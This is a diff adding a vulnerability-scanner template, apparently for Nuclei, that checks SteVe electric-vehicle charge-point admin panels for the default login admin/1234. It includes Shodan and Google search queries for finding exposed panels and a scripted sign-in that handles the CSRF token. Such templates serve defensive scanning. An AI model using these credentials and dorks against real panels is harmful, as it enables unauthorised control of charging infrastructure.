@@ -1,0 +1,59 @@
+id: steve-default-login
+
+info:
+  name: SteVe - Default login
+  author: clem9669
+  severity: high
+  description: The aim of SteVe is to support the deployment and popularity of electric mobility. SteVe provides basic functions for the administration of charge points.
+  reference:
+    - https://github.com/steve-community/steve
+    - https://github.com/steve-community/steve/blob/e42ddcf1acf6c4ad2287bb466b2d3550663ce978/src/main/resources/config/test/main.properties
+  classification:
+    cwe-id: CWE-522
+  metadata:
+    shodan-query: http.title:"SteVe - Steckdosenverwaltung"
+    google-query: intitle:"SteVe - Steckdosenverwaltung"
+  tags: panel,default-login
+
+requests:
+  - raw:
+      - |
+        GET /steve/manager/signin HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /steve/manager/signin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{username}}&password={{password}}&_csrf={{csrf}}
+
+    redirects: true
+    max-redirects: 2
+    cookie-reuse: true
+    attack: clusterbomb
+    payloads:
+      username:
+        - admin
+      password:
+        - 1234
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<a>DATA MANAGEMENT"
+
+      - type: status
+        status:
+          - 302
+          - 200
+
+    extractors:
+      - type: regex
+        part: body
+        name: csrf
+        internal: true
+        group: 1
+        regex:
+          - '_csrf" value="(.*?)"/>\n        </form>'
